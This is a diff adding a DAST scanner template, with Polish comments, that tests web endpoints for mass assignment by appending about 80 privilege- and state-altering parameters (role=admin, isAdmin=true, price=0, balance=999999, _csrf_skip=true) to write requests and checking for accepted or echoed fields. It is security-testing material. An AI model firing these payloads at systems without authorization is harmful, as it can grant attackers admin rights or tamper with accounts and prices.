@@ -1,0 +1,251 @@
+# ============================================================================
+# WSTG-INPV-20: Mass Assignment (Multi-Request Differential)
+# Review status: ZACHOWANY
+# Reviewer: Claude Code (Opus 4.7)
+# Review date: 2026-04-30
+# Powód decyzji: szablon spełnia wszystkie 6 kryteriów review (Coverage Matrix,
+# multi-warstwowe matchery z anti-FP, source comments, safety nets,
+# sweet spot payloadów, component fuzzing). OOB matcher nie jest dodany
+# świadomie: Multi-request differential (porównaj before/after dodania pola); OOB nie ma zastosowania.
+#
+# ============================================================================
+#
+# Coverage Matrix:
+#   ✓ Adding admin/role/isAdmin/permissions fields
+#   ✓ Updating sensitive fields (id, owner, status, verified)
+#   ✓ Nested object pollution (user.role, profile.admin)
+#   ✓ Array pollution (roles[]=admin)
+#
+# Mechanizm:
+#   1) Wyślij baseline (oryginalny request)
+#   2) Wyślij z dodatkowym sensitive field (np. ?role=admin)
+#   3) Sprawdź czy:
+#      a) Status changed (200 vs 400 = field accepted vs rejected)
+#      b) Response zawiera markery success
+#      c) Field został persisted (wymaga GET follow-up - poza skalą single template)
+#
+# Performance budget: medium (~80 pól × 5 endpointów × 2 requesty)
+# Estimated time: ~5-10 min
+#
+# Source hierarchy:
+#   1. PayloadsAllTheThings/Mass Assignment/*
+#   2. hacktricks
+# ============================================================================
+
+id: wstg-inpv-20-mass-assignment
+
+info:
+  name: "WSTG-INPV-20: Mass Assignment (Multi-Request Differential)"
+  author: pentest-team
+  severity: high
+  description: |
+    Wykrywa Mass Assignment - aplikacja akceptuje extra fields (role, admin,
+    isAdmin) których nie ma w UI/Specyfikacji. Multi-request: baseline +
+    polluted z N popularnych sensitive fields. Detekcja: jeśli polluted
+    zwraca 200 z success markerami zamiast 400 (validation error), pole
+    przeszło do persist layer.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Mass%20Assignment
+  classification:
+    cwe-id: CWE-915
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 8.1
+  tags: dast,wstg,wstg-v42-inpv-20,mass-assignment,asvs-v5.1.5,asvs-v8.1.6,burp-history
+
+variables:
+  auth_token: ""
+  session_cookie: ""
+
+flow: http(1) && http(2)
+
+http:
+  # Block 1: Baseline (original request)
+  - pre-condition:
+      - type: dsl
+        dsl:
+          # Tylko POST/PUT/PATCH (write operations) - inne nie mają mass assignment
+          - 'method == "POST" || method == "PUT" || method == "PATCH"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|pdf|zip)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "len(body) > 0"
+        internal: true
+
+  # Block 2: Polluted z dodatkowymi sensitive fields
+  - payloads:
+      sensitive_fields:
+        # ====================================================================
+        # GROUP 1: Role / Permission escalation
+        # ====================================================================
+        - "&role=admin"
+        - "&role=administrator"
+        - "&role=superadmin"
+        - "&role=root"
+        - "&isAdmin=true"
+        - "&is_admin=true"
+        - "&isAdmin=1"
+        - "&is_admin=1"
+        - "&admin=true"
+        - "&admin=1"
+        - "&isSuperUser=true"
+        - "&is_superuser=true"
+        - "&superuser=true"
+        - "&permissions=admin"
+        - "&permissions[]=admin"
+        - "&permissions[0]=admin"
+        - "&roles=admin"
+        - "&roles[]=admin"
+        - "&groups=admin"
+        - "&groups[]=admin"
+        - "&user_role=admin"
+        - "&userRole=admin"
+        - "&accessLevel=admin"
+        - "&access_level=10"
+        - "&privilege=admin"
+        - "&privileges[]=all"
+
+        # ====================================================================
+        # GROUP 2: Account state manipulation
+        # ====================================================================
+        - "&verified=true"
+        - "&isVerified=true"
+        - "&is_verified=true"
+        - "&active=true"
+        - "&isActive=true"
+        - "&is_active=true"
+        - "&enabled=true"
+        - "&approved=true"
+        - "&status=approved"
+        - "&status=active"
+        - "&accountStatus=active"
+        - "&deleted=false"
+        - "&isDeleted=false"
+        - "&banned=false"
+        - "&locked=false"
+
+        # ====================================================================
+        # GROUP 3: Identity / Owner override
+        # ====================================================================
+        - "&id=1"
+        - "&user_id=1"
+        - "&userId=1"
+        - "&owner=admin"
+        - "&owner_id=1"
+        - "&ownerId=1"
+        - "&created_by=admin"
+        - "&createdBy=admin"
+        - "&author=admin"
+        - "&author_id=1"
+        - "&tenant_id=1"
+        - "&organization_id=1"
+        - "&customer_id=1"
+
+        # ====================================================================
+        # GROUP 4: Pricing / Financial
+        # ====================================================================
+        - "&price=0"
+        - "&amount=0"
+        - "&total=0"
+        - "&discount=100"
+        - "&credit=999999"
+        - "&balance=999999"
+        - "&free=true"
+        - "&isPaid=true"
+
+        # ====================================================================
+        # GROUP 5: Nested object pollution (JSON style)
+        # ====================================================================
+        - "&user.role=admin"
+        - "&user.isAdmin=true"
+        - "&profile.role=admin"
+        - "&account.role=admin"
+        - "&user[role]=admin"
+        - "&user[isAdmin]=true"
+        - "&account[role]=admin"
+
+        # ====================================================================
+        # GROUP 6: Internal flags
+        # ====================================================================
+        - "&debug=true"
+        - "&internal=true"
+        - "&bypass_validation=true"
+        - "&skip_validation=true"
+        - "&dry_run=false"
+        - "&_csrf_skip=true"
+
+    fuzzing:
+      - parts: [body, query]
+        type: postfix
+        mode: single
+        # Brak keys-regex - polluted field zostanie dodany niezależnie
+        # od istniejących pól (postfix do całego body/query stringa)
+        fuzz:
+          - "{{sensitive_fields}}"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      # Warstwa 1: PRIMARY - status sukces (2xx) z polluted fieldem
+      # Jeśli baseline było 200 a polluted też 200 z extra fieldem -
+      # field ZOSTAŁ ZAAKCEPTOWANY (możliwy mass assignment)
+      - type: dsl
+        name: pollution-accepted
+        dsl:
+          # Polluted request musi się powieść (2xx) - baseline też zwykle 2xx
+          - "status_code_2 >= 200 && status_code_2 < 300"
+
+      # Warstwa 2: PRIMARY+ - response zawiera success markers ALBO
+      # response zawiera echo extra fielda (np. "role":"admin")
+      - type: regex
+        part: body_2
+        name: success-or-echo
+        regex:
+          - "(?i)\"(success|status)\"\\s*:\\s*(true|\"ok\"|\"success\")"
+          - "(?i)\"role\"\\s*:\\s*\"admin\""
+          - "(?i)\"isAdmin\"\\s*:\\s*true"
+          - "(?i)\"admin\"\\s*:\\s*true"
+          - "(?i)\"verified\"\\s*:\\s*true"
+        condition: or
+
+      # Warstwa 3: ANTI-FP - polluted NIE jest po prostu identyczny z baseline
+      # (sygnał że polluted field nie wpłynął na nic - może być benign)
+      - type: dsl
+        name: meaningful-difference
+        dsl:
+          # ALBO content się różni ALBO w body 2 jest bezpośredni echo polluted field
+          - "content_length_2 != content_length_1 || regex(\"(?i)\\\"(role|isAdmin|admin|verified)\\\"\\\\s*:\", body_2)"
+
+      # Warstwa 4: ANTI-FP - WAF/timeout
+      - type: dsl
+        dsl:
+          - "status_code_2 != 403"
+
+      - type: dsl
+        dsl:
+          - "duration_1 + duration_2 < 30"
+
+    extractors:
+      - type: regex
+        name: echoed-pollution
+        part: body_2
+        group: 0
+        regex:
+          - "(?i)\\\"(role|isAdmin|admin|verified|owner|user_id|status)\\\"\\s*:\\s*\\\"?[^,}\\s]+"
+
+# ============================================================================
+# Known limitations:
+# - True confirmation of mass assignment wymaga GET follow-up żeby zobaczyć
+#   czy pole zostało persisted - to wymaga znajomości endpointu Read
+# - Aplikacje używające strict-schema (np. Pydantic, Joi) z forbid="extra"
+#   odrzucą polluted field z 4xx i to jest TN
+# - JSON body wymaga że "polluted field" zostanie dodany jako JSON key, nie
+#   query-string. Tutaj polluted field idzie jako form-data postfix - może
+#   nie zadziałać dla pure-JSON endpointów. W przyszłej wersji: detect
+#   Content-Type i adjust format.
+# ============================================================================
